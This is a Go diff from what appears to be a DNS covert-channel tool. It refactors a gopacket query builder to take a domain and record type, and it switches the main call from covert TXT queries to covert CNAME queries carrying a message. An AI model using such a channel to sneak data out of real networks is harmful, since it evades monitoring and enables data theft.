@@ -6,7 +6,6 @@ import (
 	"math/rand"
 	"net"
 	"os"
-	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -14,41 +13,43 @@ import (
 
 const BASE_DOMAIN = "example.com"
 
-func generateDNSQuery(message string) ([][]byte, error) {
+func generateDNSQuery(domain string, qtype layers.DNSType) ([]byte, error) {
 	// Generate a random transaction ID
-	rand.Seed(time.Now().UnixNano())
-	transactionID := uint16(rand.Intn(65535))
+	// Note: For production/better randomness, use crypto/rand or rand.New(rand.NewSource(...))
+	transactionID := uint16(rand.Intn(65535)) // Using math/rand for simplicity
 
 	// Create DNS question
 	dnsQuestion := layers.DNSQuestion{
-		Name:  []byte(BASE_DOMAIN),
-		Type:  layers.DNSTypeA,
+		Name:  []byte(domain),
+		Type:  qtype, // Use the specified query type (e.g., CNAME)
 		Class: layers.DNSClassIN,
 	}
 
 	// Create DNS layer
 	dns := layers.DNS{
-		ID:      transactionID,
-		RD:      true, // Recursion Desired
-		QDCount: 1,    // One question
-		Questions: []layers.DNSQuestion{
-			dnsQuestion,
-		},
+		ID:        transactionID,
+		OpCode:    layers.DNSOpCodeQuery,
+		RD:        true, // Recursion Desired
+		QDCount:   1,    // One question
+		Questions: []layers.DNSQuestion{dnsQuestion},
+		ANCount:   0, // No answers in a query
+		NSCount:   0, // No authorities in a query
+		ARCount:   0, // No additional records in a query
 	}
 
 	// Serialize DNS layer
 	buffer := gopacket.NewSerializeBuffer()
-	options := gopacket.SerializeOptions{}
+	options := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true, // Note: UDP checksums are often optional
+	}
 
 	err := dns.SerializeTo(buffer, options)
 	if err != nil {
-		panic(err)
+		return nil, fmt.Errorf("error serializing DNS layer: %w", err)
 	}
 
-	// Create DNS packet
-	dnsPacket := buffer.Bytes()
-
-	return [][]byte{dnsPacket}, nil
+	return buffer.Bytes(), nil
 }
 
 func udpSender(dnsQueryGenerator func(string) ([][]byte, error), message string) {
@@ -129,5 +130,5 @@ func main() {
 		return
 	}
 
-	udpSender(generateCovertTXTQueries, message)
+	udpSender(generateCovertCNAMEQueries, message)
 }
